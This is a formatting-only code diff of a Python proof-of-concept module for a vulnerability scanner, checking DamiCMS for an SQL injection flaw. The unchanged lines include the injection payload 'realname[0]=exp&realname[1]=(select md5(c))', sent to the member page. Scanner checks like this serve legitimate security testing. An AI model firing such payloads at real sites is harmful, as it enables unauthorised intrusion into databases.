@@ -4,6 +4,7 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
     vuln_id = 'DamiCMS_0002_L'  # 平台漏洞编号，留空
     name = '大米CMS SQL注入'  # 漏洞名称
@@ -33,7 +34,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #需要用户登录
+            # 需要用户登录
             payload = '/index.php?s=/Member/main.tml'
             data = "realname[0]=exp&realname[1]=(select md5(c))"
             url = self.target + payload
@@ -48,6 +49,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
